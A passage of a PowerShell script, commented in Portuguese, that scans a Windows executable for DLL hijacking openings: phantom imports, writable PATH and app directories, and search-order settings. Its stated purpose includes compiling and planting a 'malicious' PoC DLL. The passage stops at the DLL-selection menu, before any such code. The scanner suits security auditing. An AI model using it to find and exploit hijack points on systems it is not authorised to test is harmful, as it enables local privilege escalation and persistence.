<#
.SYNOPSIS
    Analisa um executavel PE para vulnerabilidade de DLL Hijacking.
    Detecta DLLs fantasma (missing), diretorios PATH com permissao de escrita,
    hijacking via CWD e search order. Se vulneravel, gera e compila uma DLL PoC
    e valida o hijacking via evento nomeado (sem spawnar processos adicionais).

.PARAMETER ExePath
    Caminho para o executavel a ser analisado.

.PARAMETER GeneratePoC
    Se informado, tenta compilar e implantar a DLL maliciosa de PoC.

.PARAMETER RuntimeScan
    Executa o alvo por 3s e captura DLLs carregadas + detecta tentativas
    de carregamento que falharam (NAME NOT FOUND).

.PARAMETER InteractiveScan
    Abre o alvo normalmente para que voce interaja. Monitora DLLs e falhas
    em tempo real pelo tempo definido em -ScanSeconds (padrao 30s).

.PARAMETER ScanSeconds
    Duracao em segundos do scan interativo (padrao: 30). Usado com -InteractiveScan.

.PARAMETER DeepPathScan
    Analisa todos os diretorios do PATH do sistema e do usuario para encontrar
    locais com permissao de escrita que permitem hijacking.

.EXAMPLE
    .\Check-DllHijacking.ps1 -ExePath "C:\app\target.exe"
    .\Check-DllHijacking.ps1 -ExePath "C:\app\target.exe" -RuntimeScan
    .\Check-DllHijacking.ps1 -ExePath "C:\app\target.exe" -InteractiveScan
    .\Check-DllHijacking.ps1 -ExePath "C:\app\target.exe" -InteractiveScan -ScanSeconds 60
    .\Check-DllHijacking.ps1 -ExePath "C:\app\target.exe" -DeepPathScan
    .\Check-DllHijacking.ps1 -ExePath "C:\app\target.exe" -RuntimeScan -GeneratePoC
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$ExePath,
    [switch]$GeneratePoC,
    [switch]$RuntimeScan,
    [switch]$InteractiveScan,
    [int]$ScanSeconds = 30,
    [switch]$DeepPathScan
)

# --- Output helpers -----------------------------------------------------------
function Write-Banner {
    Write-Host ""
    Write-Host "  +==============================================================+" -ForegroundColor Cyan
    Write-Host "  |       DLL Hijacking Analyzer  +  PoC Generator               |" -ForegroundColor Cyan
    Write-Host "  +==============================================================+" -ForegroundColor Cyan
    Write-Host ""
}
function Write-Section([string]$t) { Write-Host ""; Write-Host "  [*] $t" -ForegroundColor Yellow }
function Write-Ok([string]$m)      { Write-Host "      [+] $m" -ForegroundColor Green  }
function Write-Bad([string]$m)     { Write-Host "      [-] $m" -ForegroundColor Red    }
function Write-Warn([string]$m)    { Write-Host "      [!] $m" -ForegroundColor Yellow }
function Write-Info([string]$m)    { Write-Host "          $m" -ForegroundColor Gray   }

Write-Banner

# --- Validacao ----------------------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host "  [ERRO] Arquivo nao encontrado: $ExePath" -ForegroundColor Red; exit 1
}
$ExePath = (Resolve-Path $ExePath).Path
$ExeDir  = Split-Path $ExePath -Parent
$ExeName = Split-Path $ExePath -Leaf
[byte[]]$bytes = [System.IO.File]::ReadAllBytes($ExePath)

# --- Parse PE -----------------------------------------------------------------
$peOff   = [BitConverter]::ToInt32($bytes, 0x3C)
$sig     = [System.Text.Encoding]::ASCII.GetString($bytes, $peOff, 2)
if ($sig -ne "PE") { Write-Host "  [ERRO] Nao e um PE valido." -ForegroundColor Red; exit 1 }

$machine     = [BitConverter]::ToUInt16($bytes, $peOff + 4)
$numSec      = [BitConverter]::ToUInt16($bytes, $peOff + 6)
$optMagic    = [BitConverter]::ToUInt16($bytes, $peOff + 24)
$dllChars    = [BitConverter]::ToUInt16($bytes, $peOff + 24 + 70)
$optHdrSz    = [BitConverter]::ToUInt16($bytes, $peOff + 20)
$secStart    = $peOff + 24 + $optHdrSz
$arch        = if ($optMagic -eq 0x20B) { "PE32+ (x64)" } else { "PE32 (x86)" }
$ddBase      = $peOff + 24 + $(if ($optMagic -eq 0x20B) { 112 } else { 96 })

function ConvertTo-FileOffset([uint32]$rva) {
    for ($i = 0; $i -lt $numSec; $i++) {
        $s   = $secStart + $i * 40
        $va  = [BitConverter]::ToUInt32($bytes, $s + 12)
        $vs  = [BitConverter]::ToUInt32($bytes, $s + 16)
        $raw = [BitConverter]::ToUInt32($bytes, $s + 20)
        if ($rva -ge $va -and $rva -lt ($va + $vs)) { return [int]($raw + $rva - $va) }
    }
    return -1
}

function Read-NullTermString([int]$off) {
    $sb = New-Object System.Text.StringBuilder
    while ($off -lt $bytes.Length -and $bytes[$off] -ne 0) {
        [void]$sb.Append([char]$bytes[$off]); $off++
    }
    return $sb.ToString()
}

# --- Import Table -------------------------------------------------------------
function Get-ImportDlls {
    $out = [System.Collections.Generic.List[string]]::new()
    $rva = [BitConverter]::ToUInt32($bytes, $ddBase + 8)
    if ($rva -eq 0) { return ,$out }
    $off = ConvertTo-FileOffset $rva
    if ($off -lt 0) { return ,$out }
    $idx = 0
    while ($true) {
        $nameRVA = [BitConverter]::ToUInt32($bytes, $off + $idx*20 + 12)
        if ($nameRVA -eq 0) { break }
        $nameOff = ConvertTo-FileOffset $nameRVA
        if ($nameOff -lt 0) { break }
        $out.Add((Read-NullTermString $nameOff))
        $idx++
    }
    return ,$out
}

# --- Delay Import Table ------------------------------------------------------
function Get-DelayImportDlls {
    $out = [System.Collections.Generic.List[string]]::new()
    $rva = [BitConverter]::ToUInt32($bytes, $ddBase + 13*8)
    if ($rva -eq 0) { return ,$out }
    $off = ConvertTo-FileOffset $rva
    if ($off -lt 0) { return ,$out }
    $idx = 0
    while ($true) {
        $nameRVA = [BitConverter]::ToUInt32($bytes, $off + $idx*32 + 4)
        if ($nameRVA -eq 0) { break }
        $nameOff = ConvertTo-FileOffset $nameRVA
        if ($nameOff -lt 0) { break }
        $out.Add((Read-NullTermString $nameOff))
        $idx++
    }
    return ,$out
}

# --- KnownDLLs ---------------------------------------------------------------
function Get-KnownDlls {
    $known = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    try {
        $props = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" -EA Stop
        foreach ($p in $props.PSObject.Properties) {
            if ($p.Name -like 'PS*') { continue }
            if ($p.Value -is [string] -and $p.Value -ne '') { [void]$known.Add($p.Value) }
        }
    } catch {}
    return ,$known
}

# --- Manifest -----------------------------------------------------------------
function Get-EmbeddedManifest {
    $rsrcRVA  = [BitConverter]::ToUInt32($bytes, $ddBase + 2*8)
    $rsrcSize = [BitConverter]::ToUInt32($bytes, $ddBase + 2*8 + 4)
    if ($rsrcRVA -eq 0) { return $null }
    $rsrcOff = ConvertTo-FileOffset $rsrcRVA
    $end     = [Math]::Min($rsrcOff + [int]$rsrcSize, $bytes.Length - 5)
    for ($i = $rsrcOff; $i -lt $end; $i++) {
        if ($bytes[$i] -eq 0x3C -and $bytes[$i+1] -eq 0x3F) {
            $xml = [System.Text.Encoding]::UTF8.GetString($bytes, $i, [Math]::Min(800, $bytes.Length - $i))
            if ($xml.StartsWith("<?xml")) { return $xml }
        }
    }
    return $null
}

# --- P/Invoke EnumProcessModulesEx -------------------------------------------
if (-not ([System.Management.Automation.PSTypeName]'NativeModEnum').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
public class NativeModEnum {
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_READ           = 0x0010;
    const int LIST_MODULES_ALL          = 0x03;
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("psapi.dll", SetLastError=true)]
    static extern bool EnumProcessModulesEx(IntPtr hProc, IntPtr[] mods, int cb, out int needed, int filter);
    [DllImport("psapi.dll", CharSet=CharSet.Unicode)]
    static extern int GetModuleFileNameEx(IntPtr hProc, IntPtr hMod, StringBuilder buf, int sz);
    public static string[] GetModuleNames(int pid) {
        IntPtr h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
        if (h == IntPtr.Zero) return new string[0];
        try {
            int needed = 0;
            EnumProcessModulesEx(h, null, 0, out needed, LIST_MODULES_ALL);
            if (needed == 0) return new string[0];
            IntPtr[] arr = new IntPtr[needed / IntPtr.Size];
            if (!EnumProcessModulesEx(h, arr, needed, out needed, LIST_MODULES_ALL))
                return new string[0];
            int count = needed / IntPtr.Size;
            var names = new List<string>(count);
            var sb = new StringBuilder(512);
            for (int i = 0; i < count; i++) {
                sb.Length = 0;
                if (GetModuleFileNameEx(h, arr[i], sb, 512) > 0)
                    names.Add(sb.ToString());
            }
            return names.ToArray();
        } finally { CloseHandle(h); }
    }
}
'@
}

# --- P/Invoke para checar permissao de escrita em diretorio -------------------
if (-not ([System.Management.Automation.PSTypeName]'DirWriteCheck').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.IO;
public class DirWriteCheck {
    public static bool CanWrite(string path) {
        try {
            if (!Directory.Exists(path)) return false;
            string tmp = Path.Combine(path, "__hijack_write_test_" + Guid.NewGuid().ToString("N") + ".tmp");
            try {
                File.WriteAllText(tmp, "t");
                File.Delete(tmp);
                return true;
            } catch {
                return false;
            }
        } catch { return false; }
    }
}
'@
}

# --- Resolve onde uma DLL e encontrada no search order ------------------------
function Resolve-DllLocation {
    param([string]$dllName, [string]$exeDir)
    $searchPaths = @(
        $exeDir,
        [System.IO.Path]::Combine($env:SystemRoot, "System32"),
        [System.IO.Path]::Combine($env:SystemRoot, "SysWOW64"),
        [System.IO.Path]::Combine($env:SystemRoot, "System"),
        $env:SystemRoot
    )
    $env:PATH -split ";" | Where-Object { $_ -ne "" } | ForEach-Object { $searchPaths += $_.TrimEnd('\') }

    foreach ($dir in $searchPaths) {
        $full = [System.IO.Path]::Combine($dir, $dllName)
        if ([System.IO.File]::Exists($full)) { return $full }
    }
    return $null
}

# --- Detecta SafeDllSearchMode ------------------------------------------------
function Get-SafeDllSearchMode {
    try {
        $val = Get-ItemPropertyValue "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "SafeDllSearchMode" -EA Stop
        return $val -ne 0
    } catch {
        return $true
    }
}

# --- Detecta CWD Stripping ---------------------------------------------------
function Get-CwdRemovalConfig {
    try {
        $val = Get-ItemPropertyValue "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "CWDIllegalInDllSearch" -EA Stop
        return $val
    } catch {
        return 0
    }
}

# --- Runtime DLL Monitor com deteccao de DLLs faltantes ----------------------
function Get-RuntimeLoadedDlls {
    param([string]$exePath, [int]$waitMs = 3000)
    $loaded = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    $fullPaths = [System.Collections.Generic.Dictionary[string,string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    try {
        $proc = Start-Process -FilePath $exePath -PassThru -WindowStyle Minimized -EA Stop
        if (-not $proc) { return @{ Loaded=$loaded; Paths=$fullPaths } }
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw.ElapsedMilliseconds -lt $waitMs) {
            try {
                foreach ($fullPath in [NativeModEnum]::GetModuleNames($proc.Id)) {
                    $name = [System.IO.Path]::GetFileName($fullPath)
                    if ($loaded.Add($name)) {
                        $fullPaths[$name] = $fullPath
                    }
                }
            } catch {}
            if ($proc.HasExited) { break }
            Start-Sleep -Milliseconds 300
        }
        if (-not $proc.HasExited) { $proc.Kill(); [void]$proc.WaitForExit(2000) }
    } catch {}
    return @{ Loaded=$loaded; Paths=$fullPaths }
}

function Get-InteractiveRuntimeDlls {
    param([string]$exePath, [int]$seconds = 30)
    $loaded = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    $fullPaths = [System.Collections.Generic.Dictionary[string,string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    try {
        $proc = Start-Process -FilePath $exePath -PassThru -EA Stop
        if (-not $proc) { return @{ Loaded=$loaded; Paths=$fullPaths } }
        $totalMs = $seconds * 1000
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw.ElapsedMilliseconds -lt $totalMs) {
            $remaining = [int](($totalMs - $sw.ElapsedMilliseconds) / 1000) + 1
            $newDlls = [System.Collections.Generic.List[string]]::new()
            try {
                foreach ($fullPath in [NativeModEnum]::GetModuleNames($proc.Id)) {
                    $name = [System.IO.Path]::GetFileName($fullPath)
                    if ($loaded.Add($name)) {
                        $fullPaths[$name] = $fullPath
                        $newDlls.Add($name)
                    }
                }
            } catch {}
            if ($newDlls.Count -gt 0) {
                Write-Host ""
                foreach ($d in $newDlls) {
                    Write-Host ("  [+] $d") -ForegroundColor Green
                }
                Write-Host ("  [{0,3}s] {1,3} DLL(s) capturadas" -f $remaining, $loaded.Count) `
                    -NoNewline -ForegroundColor DarkCyan
            } else {
                Write-Host ("`r  [{0,3}s] {1,3} DLL(s) capturadas" -f $remaining, $loaded.Count) `
                    -NoNewline -ForegroundColor DarkCyan
            }
            if ($proc.HasExited) {
                Write-Host "`n  [!] Processo encerrado pelo usuario." -ForegroundColor Yellow
                return @{ Loaded=$loaded; Paths=$fullPaths }
            }
            Start-Sleep -Milliseconds 500
        }
        Write-Host ""
        if (-not $proc.HasExited) { $proc.Kill(); [void]$proc.WaitForExit(2000) }
    } catch { Write-Host "" }
    return @{ Loaded=$loaded; Paths=$fullPaths }
}

# --- Coleta -------------------------------------------------------------------
Write-Host "  Analisando PE..." -ForegroundColor DarkGray

[System.Collections.Generic.List[string]]$staticDlls = Get-ImportDlls
[System.Collections.Generic.List[string]]$delayDlls  = Get-DelayImportDlls
$knownDlls     = Get-KnownDlls
$manifest      = Get-EmbeddedManifest
$safeSearch    = Get-SafeDllSearchMode
$cwdConfig     = Get-CwdRemovalConfig

# Runtime scan
$runtimeLoaded = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
$runtimePaths  = [System.Collections.Generic.Dictionary[string,string]]::new([System.StringComparer]::OrdinalIgnoreCase)

if ($RuntimeScan) {
    Write-Host "  Executando alvo por 3s para capturar DLLs runtime..." -ForegroundColor DarkGray
    $rtResult = Get-RuntimeLoadedDlls $ExePath 3000
    $runtimeLoaded = $rtResult.Loaded
    $runtimePaths  = $rtResult.Paths
    Write-Host "  $($runtimeLoaded.Count) modulos capturados em runtime." -ForegroundColor DarkGray
}

if ($InteractiveScan) {
    Write-Host ""
    Write-Host "  --- SCAN INTERATIVO -------------------------------------------------" -ForegroundColor Cyan
    Write-Host "  Abrindo '$ExeName' -- interaja normalmente com o programa." -ForegroundColor Cyan
    Write-Host "  Sera fechado automaticamente em $ScanSeconds segundo(s)." -ForegroundColor Cyan
    Write-Host "  Dica: navegue menus, abra dialogs, use funcoes para capturar mais DLLs." -ForegroundColor DarkCyan
    Write-Host "  ---------------------------------------------------------------------" -ForegroundColor Cyan
    Write-Host ""
    $interResult = Get-InteractiveRuntimeDlls $ExePath $ScanSeconds
    foreach ($d in $interResult.Loaded) { [void]$runtimeLoaded.Add($d) }
    foreach ($kv in $interResult.Paths.GetEnumerator()) {
        if (-not $runtimePaths.ContainsKey($kv.Key)) { $runtimePaths[$kv.Key] = $kv.Value }
    }
    Write-Host "  Scan encerrado: $($runtimeLoaded.Count) DLL(s) unicas acumuladas." -ForegroundColor Green
}

# --- Junta todas as DLLs sem duplicatas --------------------------------------
$allDllsSet  = [System.Collections.Generic.LinkedList[string]]::new()
$allDllsSeen = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

foreach ($d in $delayDlls)  { if ($allDllsSeen.Add($d)) { [void]$allDllsSet.AddLast($d) } }
foreach ($d in $staticDlls) { if ($allDllsSeen.Add($d)) { [void]$allDllsSet.AddLast($d) } }
foreach ($d in $runtimeLoaded) {
    if ($d -ne [System.IO.Path]::GetFileName($ExePath) -and $allDllsSeen.Add($d)) {
        [void]$allDllsSet.AddLast($d)
    }
}

# --- Classificacao de Hijacking -----------------------------------------------
$vulnList = [System.Collections.Generic.List[PSCustomObject]]::new()

# DLLs que devemos ignorar (API sets)
$apiSetPrefixes = @("api-ms-win-","ext-ms-win-","api-ms-onecoreuap-")

foreach ($dll in $allDllsSet) {
    # Pular API sets
    $isApiSet = $false
    foreach ($prefix in $apiSetPrefixes) {
        if ($dll.ToLower().StartsWith($prefix)) { $isApiSet = $true; break }
    }
    if ($isApiSet) { continue }

    # Pular KnownDLLs
    if ($knownDlls.Contains($dll)) { continue }

    $importType = if   ($delayDlls.Contains($dll))   { "Delay" }
                  elseif ($runtimeLoaded.Contains($dll) -and
                          -not $staticDlls.Contains($dll) -and
                          -not $delayDlls.Contains($dll)) { "Runtime" }
                  else { "Static" }

    # Verificar onde a DLL e encontrada
    $foundPath = Resolve-DllLocation $dll $ExeDir
    $inAppDir  = [System.IO.File]::Exists([System.IO.Path]::Combine($ExeDir, $dll))
    $inSys32   = [System.IO.File]::Exists([System.IO.Path]::Combine($env:SystemRoot, "System32", $dll))
    $inSysWow  = [System.IO.File]::Exists([System.IO.Path]::Combine($env:SystemRoot, "SysWOW64", $dll))

    # Se carregada em runtime, verificar se vem de diretorio writable
    $loadedFromWritable = $false
    $loadedDir = ""
    if ($runtimePaths.ContainsKey($dll)) {
        $loadedDir = [System.IO.Path]::GetDirectoryName($runtimePaths[$dll])
        $sys32Path = [System.IO.Path]::Combine($env:SystemRoot, "System32")
        $sysWowPath = [System.IO.Path]::Combine($env:SystemRoot, "SysWOW64")
        $winPath = $env:SystemRoot
        $protectedDirs = @($sys32Path, $sysWowPath, $winPath)
        $isProtected = $false
        foreach ($pd in $protectedDirs) {
            if ($loadedDir -eq $pd) { $isProtected = $true; break }
        }
        if (-not $isProtected -and $loadedDir -ne $ExeDir) {
            $loadedFromWritable = [DirWriteCheck]::CanWrite($loadedDir)
        }
    }

    # PHANTOM: DLL nao existe em nenhum lugar do search order
    if (-not $foundPath -and -not $runtimeLoaded.Contains($dll)) {
        $vulnList.Add([PSCustomObject]@{
            Name=$dll; Type=$importType; HijackType="PHANTOM"
            Risk="CRITICO"; Location="[NAO ENCONTRADA]"
            Detail="DLL fantasma - importada mas inexistente. Basta criar no app dir."
        })
        continue
    }

    # WRITABLE_LOAD: DLL carregada de diretorio writable que nao e o app dir
    if ($loadedFromWritable) {
        $vulnList.Add([PSCustomObject]@{
            Name=$dll; Type=$importType; HijackType="WRITABLE_LOAD"
            Risk="ALTO"; Location=$loadedDir
            Detail="Carregada de diretorio com permissao de escrita: $loadedDir"
        })
        continue
    }

    # PATH_WEAK: DLL NAO existe em System32/SysWOW64/AppDir mas o loader pode
    # buscar no PATH. Se algum diretorio PATH e writable, pode ser plantada la.
    # Tambem cobre DLLs que existem em System32 mas cujo app dir e buscado primeiro
    # e o app dir nao e writable -- nesse caso, PATH writable e vetor alternativo.
    # NOTA: Se a DLL esta em System32, o loader a encontra ANTES de chegar ao PATH
    # (search order: AppDir > System32 > System > WinDir > CWD > PATH).
    # Portanto, PATH_WEAK so se aplica a DLLs que NAO estao em System32/AppDir.
    if (-not $inSys32 -and -not $inSysWow -and -not $inAppDir) {
        $pathDirs = $env:PATH -split ";" | Where-Object { $_ -ne "" } | ForEach-Object { $_.TrimEnd('\') }
        foreach ($pDir in $pathDirs) {
            if (-not (Test-Path $pDir -EA SilentlyContinue)) { continue }
            $pDirLower = $pDir.ToLower()
            if ($pDirLower -ne $ExeDir.ToLower() -and
                $pDirLower -ne [System.IO.Path]::Combine($env:SystemRoot, "System32").ToLower() -and
                $pDirLower -ne [System.IO.Path]::Combine($env:SystemRoot, "SysWOW64").ToLower() -and
                $pDirLower -ne $env:SystemRoot.ToLower()) {
                if ([DirWriteCheck]::CanWrite($pDir)) {
                    if (-not [System.IO.File]::Exists([System.IO.Path]::Combine($pDir, $dll))) {
                        $vulnList.Add([PSCustomObject]@{
                            Name=$dll; Type=$importType; HijackType="PATH_WEAK"
                            Risk="ALTO"; Location=$pDir
                            Detail="PATH writable ($pDir) permite plantar DLL - nao encontrada em System32"
                        })
                        break
                    }
                }
            }
        }
    }

    # APP_DIR: DLL nao esta no app dir mas o app dir e writable (pode ser plantada)
    if (-not $inAppDir -and ($inSys32 -or $inSysWow) -and [DirWriteCheck]::CanWrite($ExeDir)) {
        if (-not $knownDlls.Contains($dll)) {
            $alreadyAdded = $false
            foreach ($v in $vulnList) {
                if ($v.Name -eq $dll) { $alreadyAdded = $true; break }
            }
            if (-not $alreadyAdded) {
                $vulnList.Add([PSCustomObject]@{
                    Name=$dll; Type=$importType; HijackType="APP_DIR"
                    Risk="MEDIO"; Location=$ExeDir
                    Detail="App dir writable - DLL pode ser plantada antes de System32"
                })
            }
        }
    }
}

# --- Analise de PATH writable (DeepPathScan) ----------------------------------
$writablePaths = [System.Collections.Generic.List[PSCustomObject]]::new()
if ($DeepPathScan) {
    Write-Host "  Analisando diretorios PATH..." -ForegroundColor DarkGray
    $pathDirs = $env:PATH -split ";" | Where-Object { $_ -ne "" } | ForEach-Object { $_.TrimEnd('\') }
    $seenPath = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    foreach ($pDir in $pathDirs) {
        if (-not $seenPath.Add($pDir)) { continue }
        if (-not (Test-Path $pDir -EA SilentlyContinue)) { continue }
        $writable = [DirWriteCheck]::CanWrite($pDir)
        if ($writable) {
            $isSystem = ($pDir.ToLower().StartsWith($env:SystemRoot.ToLower()))
            $aclStr = "N/A"
            try { $aclStr = (Get-Acl $pDir -EA Stop).AccessToString.Substring(0, [Math]::Min(80, (Get-Acl $pDir).AccessToString.Length)) } catch {}
            $writablePaths.Add([PSCustomObject]@{
                Path=$pDir; IsSystem=$isSystem; ACL=$aclStr
            })
        }
    }
}

# --- Ordena resultados --------------------------------------------------------
$riskOrd = @{ "CRITICO"=0; "ALTO"=1; "MEDIO"=2 }
$typeOrd = @{ "Delay"=0; "Runtime"=1; "Static"=2 }
$vulnSorted = @($vulnList | Sort-Object { $riskOrd[$_.Risk] }, { $typeOrd[$_.Type] })

# --- Protecoes ----------------------------------------------------------------
$hasAslr   = ($dllChars -band 0x0040) -ne 0
$hasDep    = ($dllChars -band 0x0100) -ne 0
$hasGs     = $false
$lcRVA     = [BitConverter]::ToUInt32($bytes, $ddBase + 10*8)
if ($lcRVA -ne 0) {
    $lcOff = ConvertTo-FileOffset $lcRVA
    if ($lcOff -ge 0) {
        $hasGs = [BitConverter]::ToUInt32($bytes, $lcOff + 60) -ne 0
    }
}

$privLevel = "desconhecido"
if ($manifest -match "requestedExecutionLevel level='([^']+)'") { $privLevel = $Matches[1] }

$sigInfo = try {
    $s = Get-AuthenticodeSignature $ExePath -EA Stop
    @{ Status=$s.Status.ToString(); Signer=$s.SignerCertificate.Subject }
} catch { @{ Status="Erro"; Signer="" } }
$isSigned = $sigInfo.Status -eq "Valid"

# --- RELATORIO ----------------------------------------------------------------
Write-Section "ALVO"
Write-Info "Arquivo      : $ExeName"
Write-Info "Tamanho      : $([math]::Round($bytes.Length/1KB,1)) KB"
Write-Info "Arquitetura  : $arch"
Write-Info "Privilegio   : $privLevel"
Write-Info "Assinatura   : $($sigInfo.Status)"
if ($sigInfo.Signer) { Write-Info "Signatario   : $($sigInfo.Signer)" }

Write-Section "PROTECOES BINARIAS"
if ($hasAslr) {
    Write-Ok "ASLR (DYNAMIC_BASE)"
} else {
    Write-Bad "ASLR desabilitado"
    Write-Info "  Correcao: link /DYNAMICBASE programa.obj"
}
if ($hasDep) {
    Write-Ok "DEP/NX (NX_COMPAT)"
} else {
    Write-Bad "DEP/NX desabilitado"
    Write-Info "  Correcao: link /NXCOMPAT programa.obj"
}
if ($hasGs) {
    Write-Ok "Stack Canary (/GS)"
} else {
    Write-Bad "Stack Canary ausente (/GS-)"
    Write-Info "  Correcao: cl /GS programa.c"
}
if ($isSigned) {
    Write-Ok "Authenticode: $($sigInfo.Status)  [$($sigInfo.Signer)]"
} else {
    Write-Bad "Authenticode: $($sigInfo.Status)"
    Write-Info "  Correcao: signtool sign /f certificado.pfx /p senha /tr http://timestamp.digicert.com /td sha256 /fd sha256 programa.exe"
}

Write-Section "CONFIGURACAO DE SEARCH ORDER"
if ($safeSearch) { Write-Ok "SafeDllSearchMode habilitado (CWD buscado depois de System32)" }
else             { Write-Bad "SafeDllSearchMode DESABILITADO -- CWD buscado ANTES de System32!" }
switch ($cwdConfig) {
    0 { Write-Warn "CWDIllegalInDllSearch: NAO CONFIGURADO -- CWD incluido no search" }
    1 { Write-Ok   "CWDIllegalInDllSearch: 1 -- CWD removido para LoadLibrary" }
    2 { Write-Ok   "CWDIllegalInDllSearch: 2 -- CWD removido para LoadLibrary e SearchPath" }
    default { Write-Info "CWDIllegalInDllSearch: $cwdConfig" }
}
$appDirWritable = [DirWriteCheck]::CanWrite($ExeDir)
if ($appDirWritable) { Write-Bad "Diretorio do app e WRITABLE pelo usuario atual: $ExeDir" }
else                 { Write-Ok  "Diretorio do app NAO e writable: $ExeDir" }

Write-Section "DLLs IMPORTADAS"
Write-Info "Import estatico : $($staticDlls.Count) DLL(s)"
Write-Info "Delay Import    : $($delayDlls.Count) DLL(s)  [carregadas via LoadLibrary() em runtime]"
if ($RuntimeScan -or $InteractiveScan) {
    $rtOnly = @($runtimeLoaded | Where-Object {
        -not $staticDlls.Contains($_) -and -not $delayDlls.Contains($_) }).Count
    $scanLabel = if ($RuntimeScan -and $InteractiveScan) { "Runtime+Interativo" }
                 elseif ($InteractiveScan) { "Interativo($ScanSeconds" + "s)" }
                 else { "Runtime (proc)" }
    Write-Info "$($scanLabel.PadRight(16)): $($runtimeLoaded.Count) DLL(s) capturadas  [$rtOnly exclusivamente runtime]"
}

# --- PATH Analysis ------------------------------------------------------------
if ($DeepPathScan -and $writablePaths.Count -gt 0) {
    Write-Section "DIRETORIOS PATH COM PERMISSAO DE ESCRITA"
    Write-Warn "$($writablePaths.Count) diretorio(s) no PATH sao writable pelo usuario atual:"
    foreach ($wp in $writablePaths) {
        $flag = if ($wp.IsSystem) { " [SYSTEM PATH!]" } else { "" }
        Write-Bad "$($wp.Path)$flag"
    }
} elseif ($DeepPathScan) {
    Write-Section "DIRETORIOS PATH COM PERMISSAO DE ESCRITA"
    Write-Ok "Nenhum diretorio writable encontrado no PATH."
}

# --- DLL Search Order visual --------------------------------------------------
Write-Section "ANALISE -- DLL HIJACKING"
Write-Info "Ordem de busca DLL (SafeDllSearchMode = $safeSearch):"
Write-Info "  1. Diretorio do .exe  $(if ($appDirWritable) { '<- WRITABLE' } else { '<- protegido' })"
Write-Info "  2. System32           <- protegido pelo OS"
Write-Info "  3. System (16-bit)    <- protegido"
Write-Info "  4. Windows dir        <- protegido"
Write-Info "  5. CWD                $(if (-not $safeSearch) { '<- ANTES de System32!' } else { '<- depois de System32' })"
Write-Info "  6. PATH dirs          <- verificar permissoes"
Write-Host ""
Write-Info "Vetores de hijacking:"
Write-Info "  PHANTOM      = DLL importada que NAO existe em lugar nenhum"
Write-Info "  WRITABLE_LOAD= DLL carregada de diretorio writable"
Write-Info "  PATH_WEAK    = Diretorio PATH writable buscado antes de System32"
Write-Info "  APP_DIR      = App dir writable permite plantar DLL"
Write-Host ""

if ($vulnSorted.Count -eq 0) {
    Write-Ok "Nenhuma DLL hijackavel encontrada na analise estatica."
    Write-Warn "Use -RuntimeScan ou -InteractiveScan para detectar DLLs carregadas dinamicamente."
} else {
    Write-Warn "$($vulnSorted.Count) DLL(s) vulneraveis a hijacking:"
    Write-Host ""
    Write-Host ("  {0,4}  {1,-26} {2,-14} {3,-10} {4,-10} {5}" -f "#","DLL","Tipo Import","Hijack","Risco","Detalhe") -ForegroundColor DarkCyan
    Write-Host ("  {0,4}  {1,-26} {2,-14} {3,-10} {4,-10} {5}" -f "----",("---"*8),("---"*4),("---"*3),("---"*3),("---"*10)) -ForegroundColor DarkGray

    for ($i = 0; $i -lt $vulnSorted.Count; $i++) {
        $v = $vulnSorted[$i]
        $color = switch ($v.Risk) {
            "CRITICO" { "Red" }
            "ALTO"    { "Magenta" }
            "MEDIO"   { "Yellow" }
            default   { "Gray" }
        }
        $tipoLabel = switch ($v.Type) { "Delay" {"Delay"} "Runtime" {"Runtime"} default {"Static"} }
        $detailShort = if ($v.Detail.Length -gt 55) { $v.Detail.Substring(0,52) + "..." } else { $v.Detail }
        Write-Host ("  {0,4}  {1,-26} {2,-14} {3,-10} {4,-10} {5}" -f ($i+1), $v.Name, $tipoLabel, $v.HijackType, $v.Risk, $detailShort) -ForegroundColor $color
    }
}

if ($vulnSorted.Count -eq 0) { exit 0 }

if (-not $GeneratePoC) {
    Write-Host ""
    Write-Host "  Execute com  -RuntimeScan         para capturar DLLs de inicializacao (3s auto).
  Execute com  -InteractiveScan      para interagir e capturar DLLs em tempo real.
  Adicione     -ScanSeconds N        para definir duracao do scan interativo.
  Execute com  -DeepPathScan         para analisar permissoes em todos os diretorios PATH.
  Execute com  -GeneratePoC          para criar e implantar a DLL PoC." -ForegroundColor DarkYellow
    exit 0
}

# --- SELETOR INTERATIVO DE DLL ALVO ------------------------------------------
Write-Host ""
Write-Host "  +==============================================================+" -ForegroundColor Cyan
Write-Host "  |     SELECIONE A DLL INICIAL PARA VALIDACAO AUTOMATICA        |" -ForegroundColor Cyan
Write-Host "  +==============================================================+" -ForegroundColor Cyan
Write-Host ""
Write-Host ("  {0,4}  {1,-26} {2,-14} {3,-10} {4,-10} {5}" -f "#","DLL","Hijack","Import","Risco","Nota") -ForegroundColor DarkCyan
Write-Host ("  {0,4}  {1,-26} {2,-14} {3,-10} {4,-10} {5}" -f "----",("---"*8),("---"*4),("---"*3),("---"*3),("---"*7)) -ForegroundColor DarkGray

for ($i = 0; $i -lt $vulnSorted.Count; $i++) {
    $v     = $vulnSorted[$i]
    $nota  = switch ($v.HijackType) {
